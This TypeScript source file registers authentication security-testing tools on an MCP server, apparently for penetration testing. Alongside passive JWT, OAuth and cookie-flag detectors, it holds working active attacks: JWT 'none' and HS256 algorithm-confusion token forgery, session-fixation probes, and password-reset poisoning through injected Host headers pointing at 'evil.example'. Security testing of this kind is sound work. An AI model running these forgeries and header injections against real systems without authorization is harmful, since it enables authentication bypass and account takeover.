import { Server } from '../mcp/server';
import axios from 'axios';
import crypto from 'crypto';
import { formatToolResult, ToolResult } from '../types';
import { saveFinding, saveTestResult } from '../integrations/postgres';

function base64Url(input: Buffer | string): string {
  const buf = Buffer.isBuffer(input) ? input : Buffer.from(input);
  return buf.toString('base64').replace(/=/g, '').replace(/\+/g, '-').replace(/\//g, '_');
}

function decodeJwt(token: string): { header: any; payload: any; signature: string } | null {
  const parts = token.split('.');
  if (parts.length < 2) return null;
  const header = JSON.parse(Buffer.from(parts[0], 'base64').toString('utf-8'));
  const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString('utf-8'));
  const signature = parts[2] || '';
  return { header, payload, signature };
}

function signHs256(header: any, payload: any, secret: string): string {
  const head = base64Url(JSON.stringify(header));
  const body = base64Url(JSON.stringify(payload));
  const data = `${head}.${body}`;
  const sig = crypto.createHmac('sha256', secret).update(data).digest();
  return `${data}.${base64Url(sig)}`;
}

export function registerAuthTools(server: Server) {
  // Detect JWT tokens (passive)
  server.tool(
    'auth.detect_jwt',
    {
      description: 'Detect and decode JWTs from headers/body/cookies (passive)',
      inputSchema: {
        type: 'object',
        properties: {
          headers: { type: 'object' },
          body: { type: 'string' },
          cookies: { type: 'array', items: { type: 'string' } },
        },
      },
    },
    async ({ headers = {}, body = '', cookies = [] }: any): Promise<ToolResult> => {
      try {
        const jwtRegex = /eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+/g;
        const sources = [
          JSON.stringify(headers || {}),
          body || '',
          (cookies || []).join('; '),
        ];
        const matches = new Set<string>();
        sources.forEach((src) => {
          const found = src.match(jwtRegex) || [];
          found.forEach((t: string) => matches.add(t));
        });

        const decoded = Array.from(matches).map((token) => ({
          token,
          decoded: decodeJwt(token),
        }));

        return formatToolResult(true, { tokens: decoded });
      } catch (error: any) {
        return formatToolResult(false, null, error.message);
      }
    }
  );

  // Detect OAuth flows (passive)
  server.tool(
    'auth.detect_oauth_flow',
    {
      description: 'Detect OAuth/OIDC flow indicators in HTML or URLs (passive)',
      inputSchema: {
        type: 'object',
        properties: {
          html: { type: 'string' },
          urls: { type: 'array', items: { type: 'string' } },
        },
      },
    },
    async ({ html = '', urls = [] }: any): Promise<ToolResult> => {
      try {
        const indicators = ['response_type=code', 'response_type=token', 'client_id=', '/oauth/authorize', 'openid'];
        const content = [html, ...urls].join('\n').toLowerCase();
        const signals = indicators.filter((i) => content.includes(i));
        return formatToolResult(true, { signals, detected: signals.length > 0 });
      } catch (error: any) {
        return formatToolResult(false, null, error.message);
      }
    }
  );

  // Detect MFA signals (passive)
  server.tool(
    'auth.detect_mfa_signals',
    {
      description: 'Detect MFA-related signals in HTML (passive)',
      inputSchema: {
        type: 'object',
        properties: {
          html: { type: 'string' },
        },
      },
    },
    async ({ html = '' }: any): Promise<ToolResult> => {
      try {
        const signals = ['mfa', 'otp', 'two-factor', 'authenticator'].filter((s) =>
          html.toLowerCase().includes(s)
        );
        return formatToolResult(true, { signals });
      } catch (error: any) {
        return formatToolResult(false, null, error.message);
      }
    }
  );

  // Detect cookie flags (passive)
  server.tool(
    'auth.detect_cookie_flags',
    {
      description: 'Detect missing cookie flags (Secure/HttpOnly/SameSite)',
      inputSchema: {
        type: 'object',
        properties: {
          setCookie: { type: 'array', items: { type: 'string' } },
        },
        required: ['setCookie'],
      },
    },
    async ({ setCookie }: any): Promise<ToolResult> => {
      try {
        const issues = (setCookie || []).map((cookie: string) => {
          const lower = cookie.toLowerCase();
          return {
            cookie,
            missing: {
              secure: !lower.includes('secure'),
              httpOnly: !lower.includes('httponly'),
              sameSite: !lower.includes('samesite'),
            },
          };
        });
        return formatToolResult(true, { issues });
      } catch (error: any) {
        return formatToolResult(false, null, error.message);
      }
    }
  );

  // JWT none algorithm
  server.tool(
    'auth.jwt_none_attack',
    {
      description: 'Try JWT none algorithm',
      inputSchema: {
        type: 'object',
        properties: {
          url: { type: 'string' },
          token: { type: 'string' },
          headerName: { type: 'string', default: 'Authorization' },
          expectedUnauthorizedStatus: { type: 'number', default: 401 },
        },
        required: ['url', 'token'],
      },
    },
    jwtNoneAttackHandler
  );

  server.tool(
    'auth.test_jwt_none',
    {
      description: 'Try JWT none algorithm (active)',
      inputSchema: {
        type: 'object',
        properties: {
          url: { type: 'string' },
          token: { type: 'string' },
          headerName: { type: 'string', default: 'Authorization' },
          expectedUnauthorizedStatus: { type: 'number', default: 401 },
        },
        required: ['url', 'token'],
      },
    },
    jwtNoneAttackHandler
  );

  // JWT alg confusion
  server.tool(
    'auth.jwt_alg_confusion',
    {
      description: 'Try JWT alg confusion (HS256 with public key)',
      inputSchema: {
        type: 'object',
        properties: {
          url: { type: 'string' },
          token: { type: 'string' },
          publicKey: { type: 'string' },
          headerName: { type: 'string', default: 'Authorization' },
        },
        required: ['url', 'token', 'publicKey'],
      },
    },
    jwtAlgConfusionHandler
  );

  server.tool(
    'auth.test_jwt_alg_confusion',
    {
      description: 'Try JWT alg confusion (active)',
      inputSchema: {
        type: 'object',
        properties: {
          url: { type: 'string' },
          token: { type: 'string' },
          publicKey: { type: 'string' },
          headerName: { type: 'string', default: 'Authorization' },
        },
        required: ['url', 'token', 'publicKey'],
      },
    },
    jwtAlgConfusionHandler
  );

  // OAuth misconfig check
  server.tool(
    'auth.oauth_misconfig',
    {
      description: 'Check OAuth redirect_uri handling',
      inputSchema: {
        type: 'object',
        properties: {
          authorizeUrl: { type: 'string' },
          clientId: { type: 'string' },
          redirectUri: { type: 'string' },
        },
        required: ['authorizeUrl', 'clientId', 'redirectUri'],
      },
    },
    async ({ authorizeUrl, clientId, redirectUri }: any): Promise<ToolResult> => {
      try {
        const url = `${authorizeUrl}?client_id=${encodeURIComponent(clientId)}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=code`;
        const response = await axios.get(url, { validateStatus: () => true, timeout: 15000, maxRedirects: 0 });

        const location = response.headers?.location || '';
        const redirectUriAccepted = location.includes(redirectUri);

        return formatToolResult(true, {
          status: response.status,
          location,
          redirectUriAccepted,
        });
      } catch (error: any) {
        return formatToolResult(false, null, error.message);
      }
    }
  );

  // Session fixation check
  server.tool(
    'auth.session_fixation',
    {
      description: 'Check for session fixation',
      inputSchema: {
        type: 'object',
        properties: {
          loginUrl: { type: 'string' },
          loginBody: { type: 'object' },
          sessionCookieName: { type: 'string', default: 'session' },
        },
        required: ['loginUrl', 'loginBody'],
      },
    },
    sessionFixationHandler
  );

  server.tool(
    'auth.test_session_fixation',
    {
      description: 'Check for session fixation (active)',
      inputSchema: {
        type: 'object',
        properties: {
          loginUrl: { type: 'string' },
          loginBody: { type: 'object' },
          sessionCookieName: { type: 'string', default: 'session' },
        },
        required: ['loginUrl', 'loginBody'],
      },
    },
    sessionFixationHandler
  );

  // Password reset poisoning
  server.tool(
    'auth.password_reset_poisoning',
    {
      description: 'Probe for password reset poisoning',
      inputSchema: {
        type: 'object',
        properties: {
          resetUrl: { type: 'string' },
          email: { type: 'string' },
          poisonHost: { type: 'string', default: 'evil.example' },
        },
        required: ['resetUrl', 'email'],
      },
    },
    passwordResetPoisoningHandler
  );

  server.tool(
    'auth.test_password_reset_poisoning',
    {
      description: 'Probe for password reset poisoning (active)',
      inputSchema: {
        type: 'object',
        properties: {
          resetUrl: { type: 'string' },
          email: { type: 'string' },
          poisonHost: { type: 'string', default: 'evil.example' },
        },
        required: ['resetUrl', 'email'],
      },
    },
    passwordResetPoisoningHandler
  );

  // MFA bypass signals
  server.tool(
    'auth.mfa_bypass_test',
    {
      description: 'Check for MFA bypass signals',
      inputSchema: {
        type: 'object',
        properties: {
          url: { type: 'string' },
          headers: { type: 'object' },
        },
        required: ['url'],
      },
    },
    async ({ url, headers = {} }: any): Promise<ToolResult> => {
      try {
        const response = await axios.get(url, {
          headers,
          validateStatus: () => true,
          timeout: 15000,
        });

        const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
        const signals = ['mfa', 'otp', 'two-factor'].filter((s) => body.toLowerCase().includes(s));

        return formatToolResult(true, { status: response.status, signals });
      } catch (error: any) {
        return formatToolResult(false, null, error.message);
      }
    }
  );
}

async function jwtNoneAttackHandler({
  url,
  token,
  headerName = 'Authorization',
  expectedUnauthorizedStatus = 401,
}: any): Promise<ToolResult> {
  try {
    const decoded = decodeJwt(token);
    if (!decoded) return formatToolResult(false, null, 'Invalid JWT');

    const header = { ...decoded.header, alg: 'none' };
    const unsigned = `${base64Url(JSON.stringify(header))}.${base64Url(JSON.stringify(decoded.payload))}.`;

    const baseline = await axios.get(url, {
      headers: { [headerName]: `Bearer ${token}` },
      validateStatus: () => true,
      timeout: 15000,
    });

    const noneResp = await axios.get(url, {
      headers: { [headerName]: `Bearer ${unsigned}` },
      validateStatus: () => true,
      timeout: 15000,
    });

    const vulnerable = baseline.status === expectedUnauthorizedStatus && noneResp.status === 200;

    if (vulnerable) {
      await saveFinding({
        target: url,
        type: 'JWT None Algorithm',
        severity: 'critical',
        description: 'JWT none algorithm accepted',
        payload: unsigned,
        response: JSON.stringify(noneResp.data).substring(0, 1000),
        timestamp: new Date(),
        score: 9,
      });
    }

    await saveTestResult(url, 'jwt_none_attack', true, { vulnerable });

    return formatToolResult(true, {
      baselineStatus: baseline.status,
      noneStatus: noneResp.status,
      vulnerable,
    });
  } catch (error: any) {
    return formatToolResult(false, null, error.message);
  }
}

async function jwtAlgConfusionHandler({
  url,
  token,
  publicKey,
  headerName = 'Authorization',
}: any): Promise<ToolResult> {
  try {
    const decoded = decodeJwt(token);
    if (!decoded) return formatToolResult(false, null, 'Invalid JWT');

    const header = { ...decoded.header, alg: 'HS256' };
    const forged = signHs256(header, decoded.payload, publicKey);

    const response = await axios.get(url, {
      headers: { [headerName]: `Bearer ${forged}` },
      validateStatus: () => true,
      timeout: 15000,
    });

    const vulnerable = response.status === 200;

    if (vulnerable) {
      await saveFinding({
        target: url,
        type: 'JWT Alg Confusion',
        severity: 'high',
        description: 'HS256 token accepted with public key',
        payload: forged,
        response: JSON.stringify(response.data).substring(0, 1000),
        timestamp: new Date(),
        score: 8,
      });
    }

    await saveTestResult(url, 'jwt_alg_confusion', true, { vulnerable });

    return formatToolResult(true, { status: response.status, vulnerable });
  } catch (error: any) {
    return formatToolResult(false, null, error.message);
  }
}

async function sessionFixationHandler({
  loginUrl,
  loginBody,
  sessionCookieName = 'session',
}: any): Promise<ToolResult> {
  try {
    const pre = await axios.get(loginUrl, { validateStatus: () => true, timeout: 15000 });
    const preCookie = (pre.headers['set-cookie'] || []).find((c: string) => c.startsWith(sessionCookieName));
    const response = await axios.post(loginUrl, loginBody, {
      headers: preCookie ? { Cookie: preCookie } : undefined,
      validateStatus: () => true,
      timeout: 15000,
    });

    const postCookie = (response.headers['set-cookie'] || []).find((c: string) => c.startsWith(sessionCookieName));

    const fixed = !!preCookie && !!postCookie && preCookie === postCookie;

    if (fixed) {
      await saveFinding({
        target: loginUrl,
        type: 'Session Fixation',
        severity: 'high',
        description: 'Session cookie did not rotate after login',
        payload: preCookie,
        response: postCookie || '',
        timestamp: new Date(),
        score: 7,
      });
    }

    await saveTestResult(loginUrl, 'session_fixation', true, { fixed });

    return formatToolResult(true, { fixed, preCookie, postCookie });
  } catch (error: any) {
    return formatToolResult(false, null, error.message);
  }
}

async function passwordResetPoisoningHandler({
  resetUrl,
  email,
  poisonHost = 'evil.example',
}: any): Promise<ToolResult> {
  try {
    const response = await axios.post(
      resetUrl,
      { email },
      {
        headers: {
          Host: poisonHost,
          'X-Forwarded-Host': poisonHost,
        },
        validateStatus: () => true,
        timeout: 15000,
      }
    );

    const body = typeof response.data === 'string' ? response.data : JSON.stringify(response.data);
    const reflected = body.includes(poisonHost);

    if (reflected) {
      await saveFinding({
        target: resetUrl,
        type: 'Password Reset Poisoning',
        severity: 'high',
        description: 'Reset response reflected injected Host header',
        payload: poisonHost,
        response: body.substring(0, 1000),
        timestamp: new Date(),
        score: 8,
      });
    }

    await saveTestResult(resetUrl, 'password_reset_poisoning', true, { reflected });

    return formatToolResult(true, { reflected, status: response.status });
  } catch (error: any) {
    return formatToolResult(false, null, error.message);
  }
}
